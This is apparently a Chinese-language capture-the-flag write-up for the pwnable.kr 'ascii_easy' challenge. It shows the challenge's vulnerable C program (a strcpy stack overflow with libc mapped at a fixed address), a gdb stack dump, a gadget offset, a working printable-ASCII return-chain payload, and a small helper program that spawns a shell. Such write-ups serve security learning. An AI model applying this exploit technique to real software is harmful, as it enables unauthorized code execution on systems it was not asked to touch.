# ascii_easy

```
We often need to make 'printable-ascii-only' exploit payload.  You wanna try?

hint : you don't necessarily have to jump at the beggining of a function. try to land anyware.


ssh ascii_easy@pwnable.kr -p2222 (pw:guest)
```

给出了源码

```
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}
```

这题基本上就是简单的栈溢出,但是栈溢出这个. 我们只能填入`ascii`的值。

在我试了很多种方法之后，我用了下面这个.
```
call sys.execve --- 0x5561676a
'h\0'           --- 0x55565d3c

0x5557506f in ?? ()
gdb-peda$ x/20wx $esp
0xffeb4620:     0x5557506f      0x5557506f      0x5557506f      0x5557506f
0xffeb4630:     0x5557506f      0x5557506f      0x5557506f      0x5557506f
0xffeb4640:     0x5557506f      0x5557506f      0x5557506f      0x5557506f
0xffeb4650:     0x5557506f      0x5561676a      0x55565d3c      0x00000000
0xffeb4660:     0x00000000      0x00c30000      0x001a35e8      0x00001000

0x0001706f : pop ebp ; ret // 0x0001706f+ 0x5555e000=0x5557506F

python -c 'print "A"*32 + "\x6f\x50\x57\x55"*14 +"\x6a\x67\x61\x55"   +"\x3c\x5d\x56\x55" '
```

在 `tmp` 目录下放 `q` 这个 `elf` 来获得 `shell` 了

```
#include<stdio.h>
int main(){
    printf("hello world\n");
    system("/bin/sh");
    return 0;
}
```

